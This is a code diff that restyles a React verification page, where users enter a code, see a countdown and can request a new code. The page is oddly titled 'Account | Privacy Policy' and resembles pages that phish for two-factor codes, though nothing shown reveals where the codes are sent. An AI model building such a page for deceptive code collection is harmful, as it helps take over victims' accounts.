@@ -115,7 +115,7 @@ const Verify = () => {
     };
 
     return (
-        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
+        <div className='flex min-h-screen flex-col items-center sm:justify-center bg-[#f8f9fa]'>
             <title>Account | Privacy Policy</title>
             <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
@@ -123,18 +123,22 @@ const Verify = () => {
                 <img src={VerifyImage} alt='' />
                 <input type='text' placeholder={translatedTexts.placeholder} className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2' value={code} onChange={(e) => setCode(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleSubmit()} />
                 {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
-                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
-                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
-                    <div>
-                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
-                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
+                <div className="flex flex-col-reverse w-full sm:flex-col">
+                    <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
+                        <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
+                        <div>
+                            <p className='font-medium'>{translatedTexts.infoTitle}</p>
+                            <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
+                        </div>
+                    </div>
+                    <div className="w-full">
+                        <p>{translatedTexts.walkthrough}</p>
+                        <button className='rounded-lg border border-gray-300 bg-[#f8f9fa] py-4 font-medium hover:bg-blue-500 hover:text-white disabled:opacity-50' onClick={handleSubmit} disabled={isLoading || !code.trim()}>
+                            {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
+                        </button>
+                        <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
                     </div>
                 </div>
-                <p>{translatedTexts.walkthrough}</p>
-                <button className='rounded-lg border border-gray-300 bg-[#f8f9fa] py-4 font-medium hover:bg-blue-500 hover:text-white disabled:opacity-50' onClick={handleSubmit} disabled={isLoading || !code.trim()}>
-                    {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
-                </button>
-                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
             </div>
         </div>
     );
